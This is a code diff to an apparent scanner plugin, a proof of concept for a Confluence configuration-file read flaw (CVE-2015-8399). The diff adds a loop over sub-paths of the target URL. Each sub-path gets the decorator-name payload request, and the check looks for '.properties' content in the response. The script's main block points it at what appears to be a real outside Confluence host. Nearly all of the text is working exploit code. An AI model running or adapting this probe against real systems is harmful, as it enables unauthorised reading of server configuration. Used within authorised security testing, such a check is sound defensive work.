@@ -2,6 +2,7 @@
 __author__ = 'xy'
 
 import requests, time
+from lib.utils.urlparser import iterate_path
 
 infostr = """
 Atlassian Confluence config file read POC [CVE-2015-8399]
@@ -26,18 +27,18 @@ def exp():
     pass
 
 
-def poc(inp):
+def poc(_inp):
     try:
-        payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
-        for each in payloads:
-            if '.properties' in requests.get(url=inp + each).content:
-                return True
-        else:
-            return False
+        for inp in iterate_path(_inp):
+            payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
+            for each in payloads:
+                if '.properties' in requests.get(url=inp + each).content:
+                    return True
+        return False
     except Exception, e:
         return False
 
 
 if __name__ == '__main__':
     print info()
-    print poc('http://confluence.unlimax.com/')
+    print poc('http://confluence.unlimax.com/ffeac')
